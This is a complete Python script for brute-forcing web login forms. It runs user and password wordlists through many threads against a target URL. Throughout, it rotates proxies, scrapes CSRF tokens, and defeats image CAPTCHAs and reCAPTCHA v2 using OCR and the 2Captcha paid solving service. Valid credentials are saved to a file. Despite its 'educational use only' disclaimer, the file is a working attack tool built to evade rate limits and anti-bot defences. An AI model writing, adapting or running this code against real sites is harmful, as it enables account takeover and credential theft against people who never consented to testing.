#!/usr/bin/env python3
"""
Ultimate Brute Force Tool v3.1 (Cleaned & Refactored)
For authorized security testing and educational purposes ONLY.
"""

import argparse
import base64
import json
import random
import re
import sys
import threading
import time
from io import BytesIO
from queue import Queue
from urllib.parse import urlparse

import requests

# Optional OCR dependencies
try:
    from PIL import Image
    import pytesseract
    OCR_AVAILABLE = True
except ImportError:
    OCR_AVAILABLE = False

# -------------------------------------------------------------------
# Global State & Thread Safety
# -------------------------------------------------------------------
found_credentials = []
state_lock = threading.Lock()
print_lock = threading.Lock()
proxy_list = []
proxy_lock = threading.Lock()
stop_flag = False

# -------------------------------------------------------------------
# Proxy Handling
# -------------------------------------------------------------------
def load_proxies(file_path: str):
    global proxy_list
    try:
        with open(file_path, 'r') as f:
            proxy_list = [line.strip() for line in f if line.strip()]
        print(f"[*] Loaded {len(proxy_list)} proxies.")
    except FileNotFoundError:
        print(f"[-] Proxy file not found: {file_path}")
        sys.exit(1)

def get_random_proxy():
    with proxy_lock:
        if not proxy_list:
            return None
        proxy = random.choice(proxy_list)
        return {'http': proxy, 'https': proxy}

# -------------------------------------------------------------------
# Headers & Cookies Parsing
# -------------------------------------------------------------------
def parse_custom_headers(header_str: str) -> dict:
    result = {}
    if not header_str:
        return result
    
    pairs = re.split(r'[,;]', header_str)
    for pair in pairs:
        if ':' in pair:
            key, _, value = pair.partition(':')
            result[key.strip()] = value.strip()
        elif '=' in pair:
            key, _, value = pair.partition('=')
            result[key.strip()] = value.strip()
    return result

def parse_cookie_string(cookie_str: str) -> dict:
    result = {}
    if not cookie_str:
        return result
    for part in cookie_str.split(';'):
        if '=' in part:
            key, _, value = part.strip().partition('=')
            result[key] = value
    return result

def load_cookie_file(file_path: str) -> dict:
    cookies = {}
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                
                parts = line.split('\t')
                if len(parts) >= 7:
                    # Netscape format
                    cookies[parts[5]] = parts[6].strip()
                elif '=' in line:
                    # Simple name=value
                    key, _, value = line.partition('=')
                    cookies[key.strip()] = value.strip()
    except FileNotFoundError:
        print(f"[-] Cookie file not found: {file_path}")
    return cookies

# -------------------------------------------------------------------
# Token & CAPTCHA Extraction
# -------------------------------------------------------------------
def extract_csrf(session: requests.Session, url: str) -> dict:
    try:
        response = session.get(url, timeout=10)
        if response.status_code == 200:
            csrf_names = ['csrfmiddlewaretoken', 'csrf_token', 'authenticity_token', 'token']
            for name in csrf_names:
                # Fixed regex to properly capture the value attribute
                pattern = rf'(?:name|id)\s*=\s*["\']?{name}["\']?.*?value\s*=\s*["\']([^"\']+)["\']'
                match = re.search(pattern, response.text, re.IGNORECASE)
                if match:
                    return {name: match.group(1)}
    except requests.exceptions.RequestException:
        pass
    return {}

def extract_image_captcha(session: requests.Session, url: str):
    try:
        response = session.get(url, timeout=10)
        if response.status_code != 200:
            return None
            
        img_patterns = [
            r'<img[^>]+(?:id|name|class)=["\']?([^"\'>]*captcha[^"\'>]*)["\']?[^>]*src=["\']([^"\']+)["\']',
            r'<img[^>]+src=["\']([^"\']*captcha[^"\']*)["\']',
            r'<img[^>]+src=["\']data:image/(\w+);base64,([^"\']+)["\']'
        ]
        
        for pattern in img_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                for match in matches:
                    if isinstance(match, tuple) and len(match) >= 2:
                        field_id, src = match[0], match[1]
                    else:
                        src = match
                        field_id = 'captcha'

                    if 'data:image' in src:
                        mime_match = re.match(r'data:image/(\w+);base64,(.+)', src)
                        if mime_match:
                            img_bytes = base64.b64decode(mime_match.group(2))
                            return img_bytes, {field_id: ''}
                    else:
                        img_url = src if src.startswith('http') else f"{urlparse(url).scheme}://{urlparse(url).netloc}{src}"
                        img_resp = session.get(img_url, timeout=10)
                        if img_resp.status_code == 200:
                            return img_resp.content, {field_id: ''}
        return None
    except requests.exceptions.RequestException:
        return None

def detect_recaptcha(session: requests.Session, url: str):
    try:
        response = session.get(url, timeout=10)
        if response.status_code == 200:
            # Fixed regex to properly capture the sitekey
            pattern = r'data-sitekey\s*=\s*["\']([^"\']+)["\']'
            match = re.search(pattern, response.text, re.IGNORECASE)
            if match:
                return match.group(1), url
            
            pattern_key = r'data-key\s*=\s*["\']([^"\']+)["\']'
            match_key = re.search(pattern_key, response.text, re.IGNORECASE)
            if match_key:
                return match_key.group(1), url
        return None
    except requests.exceptions.RequestException:
        return None

# -------------------------------------------------------------------
# CAPTCHA Solving
# -------------------------------------------------------------------
def solve_image_captcha_ocr(img_bytes: bytes):
    if not OCR_AVAILABLE:
        return None
    try:
        img = Image.open(BytesIO(img_bytes)).convert('L')
        # Simple thresholding to improve OCR accuracy
        img = img.point(lambda p: 255 if p > 128 else 0)
        return pytesseract.image_to_string(img, config='--psm 7').strip() or None
    except Exception:
        return None

def solve_recaptcha_v2(api_key: str, sitekey: str, page_url: str):
    if not api_key or not sitekey:
        return None
    try:
        submit_url = "http://2captcha.com/in.php"
        data = {
            'key': api_key,
            'method': 'userrecaptcha',
            'googlekey': sitekey,
            'pageurl': page_url,
            'json': 1,
        }
        resp = requests.post(submit_url, data=data, timeout=15)
        if resp.status_code != 200:
            return None
            
        result = resp.json()
        if result.get('status') != 1:
            return None
        captcha_id = result.get('request')

        # Poll for the solution
        poll_url = "http://2captcha.com/res.php"
        for _ in range(30):
            time.sleep(3)
            params = {'key': api_key, 'action': 'get', 'id': captcha_id, 'json': 1}
            retry = requests.get(poll_url, params=params, timeout=10)
            if retry.status_code != 200:
                continue
                
            poll_result = retry.json()
            if poll_result.get('status') == 1:
                return poll_result.get('request')
            if 'CAPCHA_NOT_READY' not in str(poll_result):
                return None
        return None
    except Exception:
        return None

def solve_image_captcha_service(api_key: str, img_bytes: bytes):
    try:
        api_url = "http://2captcha.com/in.php"
        files = {'file': ('captcha.jpg', img_bytes, 'image/jpeg')}
        data = {'key': api_key, 'method': 'post'}
        resp = requests.post(api_url, data=data, files=files, timeout=15)
        
        if resp.text.startswith('OK|'):
            captcha_id = resp.text.split('|')[1]
            for _ in range(30):
                time.sleep(3)
                check_url = f"http://2captcha.com/res.php?key={api_key}&action=get&id={captcha_id}"
                check = requests.get(check_url, timeout=10)
                if check.text.startswith('OK|'):
                    return check.text.split('|')[1]
                elif 'CAPCHA_NOT_READY' not in check.text:
                    return None
    except Exception:
        pass
    return None

# -------------------------------------------------------------------
# Core Login Logic
# -------------------------------------------------------------------
def attempt_login(url: str, username: str, password: str, result_file: str, 
                  method: str, params: dict, success_str: str, delay: float, 
                  proxy: dict, captcha_key: str, recaptcha_key: str, use_recaptcha: bool):
    
    session = requests.Session()
    # Note: custom_headers and custom_cookies are assumed to be set globally or passed. 
    # For cleanliness, we'll rely on the global setup in main() or pass them if needed.
    
    if proxy:
        session.proxies.update(proxy)

    # Fetch login page to extract dynamic tokens
    csrf_data = extract_csrf(session, url)
    img_captcha = extract_image_captcha(session, url)
    recaptcha_info = detect_recaptcha(session, url) if use_recaptcha else None

    data = {}
    if params:
        for key, value in params.items():
            if value == '__USER__':
                data[key] = username
            elif value == '__PASS__':
                data[key] = password
            else:
                data[key] = value
    else:
        data = {'username': username, 'password': password}

    if csrf_data:
        data.update(csrf_data)

    # Handle Image CAPTCHA
    if img_captcha:
        img_bytes, captcha_fields = img_captcha
        solution = None
        
        if captcha_key:
            solution = solve_image_captcha_service(captcha_key, img_bytes)
        elif OCR_AVAILABLE:
            solution = solve_image_captcha_ocr(img_bytes)
            
        if solution:
            for field in captcha_fields:
                data[field] = solution
        else:
            return False

    # Handle reCAPTCHA v2
    if recaptcha_info:
        sitekey, page_url = recaptcha_info
        key = recaptcha_key or captcha_key
        token = solve_recaptcha_v2(key, sitekey, page_url)
        if token:
            data['g-recaptcha-response'] = token
            data['recaptcha'] = token
        else:
            return False

    # Send the actual login request
    try:
        if method.upper() == 'POST':
            response = session.post(url, data=data, timeout=15, allow_redirects=True)
        else:
            if url.startswith('http'):
                response = session.get(url, auth=(username, password), timeout=15)
            else:
                response = session.get(url, params=data, timeout=15)

        # Success detection
        success = False
        if success_str:
            if success_str.lower() in response.text.lower():
                success = True
        else:
            if response.status_code not in [401, 403]:
                lower_text = response.text.lower()
                if 'invalid' not in lower_text and 'failed' not in lower_text and 'error' not in lower_text:
                    if len(response.history) > 0 and response.url != url:
                        success = True
                    elif 'logout' in lower_text or 'dashboard' in lower_text:
                        success = True

        if success:
            with state_lock:
                with print_lock:
                    print(f"\n[+] SUCCESS: {username}:{password}")
                    print(f"    URL: {response.url}")
                    print(f"    Status: {response.status_code}")
                    if proxy:
                        print(f"    Proxy: {proxy}")
                
                found_credentials.append(f"{username}:{password}")
                with open(result_file, 'a') as f:
                    f.write(f"{username}:{password}\n")
            return True
            
    except requests.exceptions.ProxyError:
        pass
    except requests.exceptions.RequestException:
        pass

    if delay > 0:
        time.sleep(delay)
    return False

# -------------------------------------------------------------------
# Worker Thread
# -------------------------------------------------------------------
def worker(q: Queue, args):
    global stop_flag
    while not q.empty() and not stop_flag:
        try:
            username, password = q.get()
            
            with print_lock:
                sys.stdout.write(f"\r[*] Trying: {username}:{password}    ")
                sys.stdout.flush()

            proxy = get_random_proxy() if args.proxy_file else None

            attempt_login(
                url=args.url,
                username=username,
                password=password,
                result_file=args.output,
                method=args.method,
                params=args.parsed_params,
                success_str=args.success,
                delay=args.delay,
                proxy=proxy,
                captcha_key=args.captcha_key,
                recaptcha_key=args.recaptcha_key,
                use_recaptcha=args.recaptcha
            )
        except Exception:
            pass
        finally:
            q.task_done()

# -------------------------------------------------------------------
# Main Execution
# -------------------------------------------------------------------
def main():
    global stop_flag, custom_headers, custom_cookies
    
    # Custom globals for this run
    global custom_headers, custom_cookies
    custom_headers = {}
    custom_cookies = {}

    parser = argparse.ArgumentParser(description='Ultimate Brute Force Tool for Termux (Educational Use Only)')
    parser.add_argument('-u', '--url', required=True, help='Target login URL')
    parser.add_argument('-U', '--users', required=True, help='Username list file')
    parser.add_argument('-P', '--passwords', required=True, help='Password list file')
    parser.add_argument('-m', '--method', choices=['POST', 'GET'], default='POST', help='HTTP method (default: POST)')
    parser.add_argument('--params', help='Custom POST parameters, e.g. "user=__USER__&pass=__PASS__&login=submit"')
    parser.add_argument('-s', '--success', help='Success indicator string (e.g. "welcome" or "logout")')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of threads (default: 5)')
    parser.add_argument('-o', '--output', default='found.txt', help='Output file (default: found.txt)')
    parser.add_argument('-d', '--delay', type=float, default=0, help='Delay between attempts in seconds')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode')
    parser.add_argument('--proxy-file', help='File containing proxies (http:// or socks5://)')
    parser.add_argument('--captcha-key', help='2Captcha API key for image CAPTCHA')
    parser.add_argument('--recaptcha', action='store_true', help='Enable reCAPTCHA v2 solving')
    parser.add_argument('--recaptcha-key', help='2Captcha API key for reCAPTCHA (defaults to --captcha-key)')
    parser.add_argument('--headers', help='Custom HTTP headers (e.g. "Authorization: Bearer xyz")')
    parser.add_argument('--cookies', help='Custom cookies as string (e.g. "session=abc; user=admin")')
    parser.add_argument('--cookie-file', help='File containing cookies (Netscape format or name=value lines)')
    
    args = parser.parse_args()

    # Load wordlists
    try:
        with open(args.users, 'r', encoding='utf-8', errors='ignore') as f:
            users = [line.strip() for line in f if line.strip()]
        with open(args.passwords, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError as e:
        print(f"[-] File not found: {e.filename}")
        sys.exit(1)

    # Load proxies
    if args.proxy_file:
        load_proxies(args.proxy_file)

    # Parse headers & cookies
    custom_headers = parse_custom_headers(args.headers)
    if custom_headers and not args.quiet:
        print(f"[*] Custom headers applied.")

    if args.cookies:
        custom_cookies.update(parse_cookie_string(args.cookies))
    if args.cookie_file:
        custom_cookies.update(load_cookie_file(args.cookie_file))
    if custom_cookies and not args.quiet:
        print(f"[*] Custom cookies applied.")

    # Parse params
    parsed_params = None
    if args.params:
        parsed_params = {}
        for item in args.params.split('&'):
            key, _, value = item.partition('=')
            parsed_params[key] = value
    args.parsed_params = parsed_params  # Attach to args for worker access

    if not args.quiet:
        print(f"""
    ╔══════════════════════════════════════════════════════════════╗
    ║        Ultimate Brute Force Tool v3.1 (Cleaned)              ║
    ║  Target: {args.url[:40]:<45} ║
    ║  Users: {len(users):<4} Passwords: {len(passwords):<5} Threads: {args.threads:<15} ║
    ║  Proxies: {len(proxy_list) if args.proxy_file else 0:<4} Headers: {'Yes' if custom_headers else 'No':<4} Cookies: {'Yes' if custom_cookies else 'No':<4}   ║
    ║  reCAPTCHA: {'On' if args.recaptcha else 'Off':<4} Image CAPTCHA: {'On' if args.captcha_key or OCR_AVAILABLE else 'Off':<12}        ║
    ╚══════════════════════════════════════════════════════════════╝
    """)
        print(f"[*] Total combinations: {len(users) * len(passwords)}")
        print(f"[*] Starting brute force... Press Ctrl+C to stop.\n")

    # Build queue
    q = Queue()
    for user in users:
        for pwd in passwords:
            q.put((user, pwd))

    threads = []
    try:
        for _ in range(min(args.threads, q.qsize())):
            t = threading.Thread(target=worker, args=(q, args), daemon=True)
            t.start()
            threads.append(t)

        q.join()
        print(f"\n\n[*] Brute force finished.")
        print(f"[*] Found {len(found_credentials)} credential(s).")
        if found_credentials:
            print(f"[*] Results saved to: {args.output}")
            
    except KeyboardInterrupt:
        stop_flag = True
        print(f"\n\n[!] Interrupted. Found {len(found_credentials)} credential(s) so far.")
        sys.exit(0)

if __name__ == '__main__':
    main()
